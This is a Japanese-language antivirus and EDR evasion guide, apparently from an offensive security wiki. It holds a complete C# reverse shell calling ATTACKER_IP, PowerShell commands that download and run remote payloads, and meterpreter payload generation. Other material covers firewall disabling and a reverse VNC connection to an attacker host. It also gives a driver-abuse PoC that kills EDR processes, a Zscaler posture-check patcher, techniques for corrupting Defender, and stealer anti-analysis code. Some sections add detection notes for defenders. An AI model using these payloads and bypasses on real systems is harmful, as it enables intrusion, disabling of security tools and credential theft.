<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

自分自身のプロセスに post-exploitation の悪性コードを注入する方法です。新規プロセスを作成して AV にスキャンされるリスクを避けられますが、ペイロードの実行で問題が起きるとプロセスがクラッシュして beacon を**失う可能性が高い**という欠点があります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly ロードについて詳しく知りたい場合はこの記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) とその InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を確認してください。

また、PowerShell から C# Assemblies をロードすることも可能です。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を参照してください。

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、攻撃者が管理する SMB シェア上にインストールされたインタプリタ環境に、侵害されたマシンがアクセスできるようにすることで、他の言語を使って悪性コードを実行することが可能です。

SMB シェア上のインタプリタバイナリと環境へのアクセスを許可することで、侵害マシンのメモリ内でこれらの言語による任意コードを実行できます。

リポジトリでは、Defender はスクリプトをスキャンするが、Go, Java, PHP 等を利用することで**静的シグネチャを回避する柔軟性が増す**と示しています。これらの言語でのランダムな非難号化 reverse shell スクリプトでのテストは成功を示しています。

## TokenStomping

Token stomping は、攻撃者がアクセス トークンや EDR や AV のようなセキュリティプロダクトを**操作して権限を低下させ**、プロセスが終了しないようにしつつも悪性活動を検出・確認する権限を持たせないようにする技術です。

これを防ぐために、Windows はセキュリティプロセスのトークンに対して外部プロセスがハンドルを取得することを制限するべきです。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) に示されているように、被害者の PC に Chrome Remote Desktop を展開し、これを使って乗っ取りと永続化を行うのは簡単です:
1. https://remotedesktop.google.com/ からダウンロードし、"Set up via SSH" をクリックし、Windows 用の MSI ファイルをクリックしてダウンロードします。
2. 被害者側でインストーラをサイレント実行（管理者権限が必要）: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop のページに戻り、Next をクリックします。ウィザードは認可を求めるので、続行するには Authorize ボタンをクリックします。
4. 指定されたパラメータをいくつか調整して実行します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（GUI を使わずに pin を設定できる点に注意）

## Advanced Evasion

Evasion は非常に複雑なトピックで、単一のシステム内で多数の異なるテレメトリソースを考慮する必要があるため、成熟した環境で完全に検出を免れるのはほぼ不可能です。

対峙する各環境にはそれぞれ強みと弱みがあります。

より高度な Evasion 技術を学ぶために、[@ATTL4S](https://twitter.com/DaniLJ94) のこのトークを見ることを強く勧めます。

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これはまた、[@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth の素晴らしい講演です。

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、Defender がどの部分を悪性と検出しているかを特定するためにバイナリの一部を**削除しながら**調べ、問題の部分を切り分けてくれます。\
同様のことを行うもう一つのツールは [**avred**](https://github.com/dobin/avred) で、サービスを公開しているウェブは [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) です。

### **Telnet Server**

Windows10 以前のすべての Windows では、管理者権限でインストールできる **Telnet server** が付属していました。
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システム起動時に**start**するように設定し、今**run**してください:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnetポートを変更する** (ステルス) および firewall を無効化:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

ダウンロード: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（bin ダウンロードを選択してください、setup ではありません）

**ON THE HOST**: _**winvnc.exe**_ を実行し、サーバを設定する:

- オプション _Disable TrayIcon_ を有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

次に、バイナリ _**winvnc.exe**_ と **新たに** 作成されたファイル _**UltraVNC.ini**_ を **victim** 内に移動する

#### **Reverse connection**

The **attacker** は自身の **host** 内でバイナリ `vncviewer.exe -listen 5900` を実行して、リバース **VNC connection** を受ける準備をする。次に、**victim** 側では: winvnc デーモンを `winvnc.exe -run` で起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行する

**WARNING:** ステルスを維持するためにいくつか行ってはいけないことがある

- `winvnc` が既に実行中の場合は起動しない（起動すると [ポップアップ](https://i.imgur.com/1SROTTl.png) が表示される）。`tasklist | findstr winvnc` で実行中か確認する
- `UltraVNC.ini` が同じディレクトリにない状態で `winvnc` を起動しない（起動すると [設定ウィンドウ](https://i.imgur.com/rfMQWcf.png) が開く）
- ヘルプ目的で `winvnc -h` を実行しない（実行すると [ポップアップ](https://i.imgur.com/oc18wcu.png) が表示される）

### GreatSCT

ダウンロード: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
今、`msfconsole -r file.rc` で**リスナーを起動**し、次のコマンドで**xml payload**を**実行**します:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在の Defender はプロセスを非常に速く終了させます。**

### 自分の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

次のコマンドでコンパイルする:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
これを使用するには:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# コンパイラを使用
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# の難読化ツール一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python を使用した build injectors の例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間からのAV/EDRの無効化

Storm-2603 は、ランサムウェアを展開する前にエンドポイント保護を無効化するために **Antivirus Terminator** という小さなコンソールユーティリティを利用しました。このツールは **独自の脆弱だが*署名済み*のドライバー** を持ち込み、それを悪用して Protected-Process-Light (PPL) の AV サービスでさえブロックできない特権付きカーネル操作を実行します。

Key take-aways
1. **Signed driver**: ディスクに配置されるファイル名は `ServiceMouse.sys` ですが、バイナリ自体は Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる正規署名済みドライバー `AToolsKrnl64.sys` です。ドライバーが有効な Microsoft 署名を持つため、Driver-Signature-Enforcement (DSE) が有効でもロードされます。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
最初の行はドライバーを **カーネルサービス** として登録し、2 行目はそれを起動して `\\.\ServiceMouse` をユーザランドからアクセス可能にします。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD はユーザモードの保護を完全に回避します。カーネルで実行されるコードは *保護された* プロセスを開いたり、終了させたり、PPL/PP、ELAM やその他のハードニング機能に関係なくカーネルオブジェクトを改ざんしたりできます。

Detection / Mitigation
•  Microsoft の脆弱なドライバーをブロックするリスト（`HVCI`, `Smart App Control`）を有効にして、`AToolsKrnl64.sys` のロードを拒否する。  
•  新しい *カーネル* サービスの作成を監視し、ドライバーがワールドライト可能なディレクトリからロードされた場合や許可リストにない場合はアラートを上げる。  
•  カスタムデバイスオブジェクトへのユーザモードハンドルの作成と、それに続く疑わしい `DeviceIoControl` 呼び出しを監視する。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler の **Client Connector** はデバイスポスチャルールをローカルで適用し、その結果を他のコンポーネントと通信するために Windows RPC を利用します。以下の二つの設計上の弱点により完全なバイパスが可能になります:

1. Posture 評価は **完全にクライアント側で行われる**（サーバーにはブール値が送られる）。  
2. 内部 RPC エンドポイントは接続してくる実行ファイルが **Zscaler によって署名されているか**（`WinVerifyTrust` 経由）だけを検証する。

ディスク上の署名済みバイナリ4つをパッチすることで、両方のメカニズムを無効化できます:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換え、サービススタックを再起動した後:

* **All** posture checks は **green/compliant** と表示される。
* 署名されていない、または変更されたバイナリでも named-pipe RPC endpoints を開ける（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 侵害されたホストは Zscaler ポリシーで定義された内部ネットワークへの無制限のアクセスを得る。

このケーススタディは、純粋にクライアント側の信頼判断と単純な署名チェックが、わずかなバイトパッチでどのように破れるかを示す。

## Protected Process Light (PPL) を悪用して LOLBINs で AV/EDR を改ざんする

Protected Process Light (PPL) は署名者/レベルの階層を強制し、同等以上の保護されたプロセスのみがお互いを改ざんできるようにする。攻撃的には、正当に PPL 対応バイナリを起動し、その引数を制御できれば、無害な機能（例: ロギング）を AV/EDR が使用する保護されたディレクトリに対する制約付きの、PPL 裏付けの書き込みプリミティブに変換できる。

What makes a process run as PPL
- ターゲットの EXE（およびロードされる DLL）は PPL 対応の EKU で署名されている必要がある。
- プロセスは CreateProcess で次のフラグを使って作成される必要がある: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- バイナリの署名者と一致する互換性のある保護レベルを要求する必要がある（例: `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` はアンチマルウェア署名者用、`PROTECTION_LEVEL_WINDOWS` は Windows 署名者用）。不適切なレベルだと作成時に失敗する。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数をターゲット EXE に転送する）:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 使用パターン:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN プリミティブ: ClipUp.exe
- 署名済みシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自分でプロセスを生成し、呼び出し元が指定したパスにログファイルを書き込むためのパラメータを受け取ります。
- PPL プロセスとして起動すると、ファイル書き込みは PPL 保護の下で行われます。
- ClipUp はスペースを含むパスを解析できないため、通常保護されている場所を指定する際は 8.3 short paths を使用してください。

8.3 short path helpers
- 短い名前を一覧表示: `dir /x` を各親ディレクトリで実行。
- cmd で短縮パスを導出: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) ランチャー（例: CreateProcessAsPPL）を使って `CREATE_PROTECTED_PROCESS` で PPL 対応の LOLBIN (ClipUp) を起動します。
2) ClipUp のログパス引数を渡して、保護された AV ディレクトリ（例: Defender Platform）にファイル作成を強制します。必要であれば 8.3 short names を使用してください。
3) ターゲットバイナリが通常 AV によって実行中に開かれて/ロックされている場合（例: MsMpEng.exe）、AV が起動する前のブート時に書き込みを行うよう、より早く確実に実行される自動起動サービスをインストールしてスケジュールします。ブート順序は Process Monitor（boot logging）で検証してください。
4) 再起動時、PPL 保護での書き込みが AV がバイナリをロックする前に行われ、ターゲットファイルを破損させて起動を妨げます。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事項と制約
- ClipUp が書き込む内容は配置以外では制御できない；このプリミティブは精密なコンテンツ注入よりも破損に適している。
- サービスをインストール/開始するためのローカル Administrator/SYSTEM 権限と再起動の時間枠が必要。
- タイミングが重要：対象が開かれていない必要がある。ブート時実行はファイルロックを回避する。

検出
- 異常な引数で起動された `ClipUp.exe` のプロセス生成、特に非標準のランチャーを親にしている場合やブート周辺での発生。
- 自動起動に設定された疑わしいバイナリを指す新規サービスや、Defender/AV より先に一貫して起動するサービス。Defender の起動失敗前のサービス作成/変更を調査する。
- Defender バイナリ/Platform ディレクトリに対するファイル整合性監視；protected-process フラグを持つプロセスによる予期せぬファイル作成/変更を確認する。
- ETW/EDR テレメトリ：`CREATE_PROTECTED_PROCESS` で作成されたプロセスや、非-AV バイナリによる異常な PPL レベルの使用を探す。

対策
- WDAC/Code Integrity：どの署名済みバイナリが PPL として、どの親プロセスの下で実行できるかを制限する。正当なコンテキスト外での ClipUp 呼び出しをブロックする。
- サービス管理：自動起動サービスの作成/変更を制限し、起動順序の改ざんを監視する。
- Defender の tamper protection と early-launch protections を有効にする；バイナリ破損を示す起動エラーを調査する。
- 環境と互換性がある場合は、セキュリティツールを配置するボリュームで 8.3 ショートネーム生成を無効化することを検討する（十分にテストすること）。

PPL とツールの参照
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Platform Version Folder Symlink Hijack による Microsoft Defender の改ざん

Windows Defender は、以下の下位フォルダーを列挙して実行するプラットフォームを選択する：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

最も辞書順で大きいバージョン文字列（例：`4.18.25070.5-0`）を持つサブフォルダーを選び、そこから Defender サービスプロセスを起動する（サービス/レジストリのパスを更新する）。この選択はディレクトリエントリ（directory reparse points (symlinks) を含む）を信頼する。管理者はこれを利用して Defender を攻撃者が書き込み可能なパスにリダイレクトし、DLL sideloading やサービスの停止を引き起こすことができる。

前提条件
- ローカル Administrator（Platform フォルダー下にディレクトリ/シンボリックリンクを作成するために必要）
- 再起動または Defender のプラットフォーム再選択をトリガーできる能力（ブート時のサービス再起動）
- 組み込みツールのみで可能（mklink）

仕組み
- Defender は自身のフォルダーへの書き込みをブロックするが、プラットフォーム選択はディレクトリエントリを信頼し、対象が保護/信頼済みのパスに解決されるかを検証せずに辞書順で最大のバージョンを選択する。

手順（例）
1) 現在の platform フォルダーの書き込み可能なクローンを準備する。例：`C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、あなたのフォルダを指す上位バージョンのディレクトリ symlink を作成する:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガー選択（再起動推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認する:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLLs を配置・置換して Defender のプロセス内でコードを実行する。詳細は上のセクションを参照: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink を削除すると、次回起動時に設定されたパスが解決されず Defender が起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> この手法自体は権限昇格を提供しません。管理者権限が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teamは、C2 implantのランタイム回避を標的モジュール自体に移し、Import Address Table (IAT)をフックして、選択したAPIを攻撃者管理のposition‑independent code (PIC)経由にルーティングすることでこれを行えます。これにより、多くのキットが露出する小さなAPI表面（例: CreateProcessA）を超えて回避が一般化され、同じ保護をBOFsやpost‑exploitation DLLsにも拡張します。

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- フックされたインポートを使用する任意のコードで動作し、ツールのコードを変更したりBeaconに特定APIのプロキシを頼ったりする必要がない。
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- CreateProcessA/Wをラップすることで、call‑stack–based検知に対してプロセス生成を行うpost‑exコマンドを確実に利用できるようにする。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
注意
- パッチは relocations/ASLR の後、インポートを最初に使用する前に適用する。TitanLdr/AceLdr のような reflective loaders は、読み込まれたモジュールの DllMain 中にフックを行う例を示す。
- ラッパーは小さく PIC-safe に保つ。真の API は、パッチ適用前に取得した元の IAT 値か LdrGetProcedureAddress 経由で解決する。
- PIC には RW → RX の遷移を使い、writable+executable ページを残さないこと。

コールスタック偽装スタブ
- Draugr‑style PIC stubs は偽のコールチェーン（正当なモジュール内へのリターンアドレス）を構築し、その後実際の API にピボットする。
- これにより、Beacon/BOFs から敏感な API への正規のスタックを期待する検出を回避できる。
- stack cutting/stack stitching 技術と組み合わせて、API のプロローグ前に期待されるフレーム内に着地させる。

運用統合
- post‑ex DLLs の先頭に reflective loader を付けることで、DLL がロードされた際に PIC とフックが自動的に初期化されるようにする。
- Aggressor スクリプトを使ってターゲット API を登録し、Beacon と BOFs がコード変更なしに同じ evasion path を透過的に利用できるようにする。

検出/DFIR の考慮事項
- IAT integrity: non‑image（heap/anon）アドレスに解決されるエントリ；インポートポインタの定期的な検証。
- Stack anomalies: ロードされたイメージに属さないリターンアドレス；非イメージ PIC への急激な遷移；一貫性のない RtlUserThreadStart の祖先関係。
- Loader telemetry: プロセス内での IAT 書き込み、import thunk を変更するような早期の DllMain 活動、ロード時に作成される予期しない RX 領域。
- Image‑load evasion: LoadLibrary* をフックしている場合、memory masking イベントと相関する automation/clr assemblies の怪しいロードを監視する。

関連する構成要素と例
- ロード中に IAT パッチを行う reflective loaders (例: TitanLdr, AceLdr)
- Memory masking hooks (例: simplehook) と stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (例: Draugr)

## SantaStealer のファイルレス回避と認証情報窃取のトレードクラフト

SantaStealer (aka BluelineStealer) は、現代の info-stealers が AV bypass、anti-analysis、credential access を単一のワークフローでどのように組み合わせるかを示している。

### キーボードレイアウトによるゲーティングとサンドボックス遅延

- 設定フラグ (`anti_cis`) は `GetKeyboardLayoutList` を使ってインストールされたキーボードレイアウトを列挙する。キリル文字レイアウトが見つかった場合、サンプルは空の `CIS` マーカーを残して終了し、stealers の実行前に停止することで、除外されたロケールで起爆せずにハンティング用の痕跡を残す。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 多層の `check_antivm` ロジック

- Variant A はプロセスリストを走査し、各名前をカスタムのローリングチェックサムでハッシュ化して、組み込みのブロックリスト（debuggers/sandboxes 向け）と照合する；同じチェックサムをコンピュータ名にも繰り返し、`C:\analysis` のような作業ディレクトリを確認する。
- Variant B はシステムプロパティ（プロセス数の閾値、最近の uptime）を検査し、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出し、sleep 周辺のタイミングチェックで single-stepping を探索する。いずれかが検出されるとモジュール起動前に中止する。

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.


### モジュール式の in-memory 収集 & chunked HTTP exfil

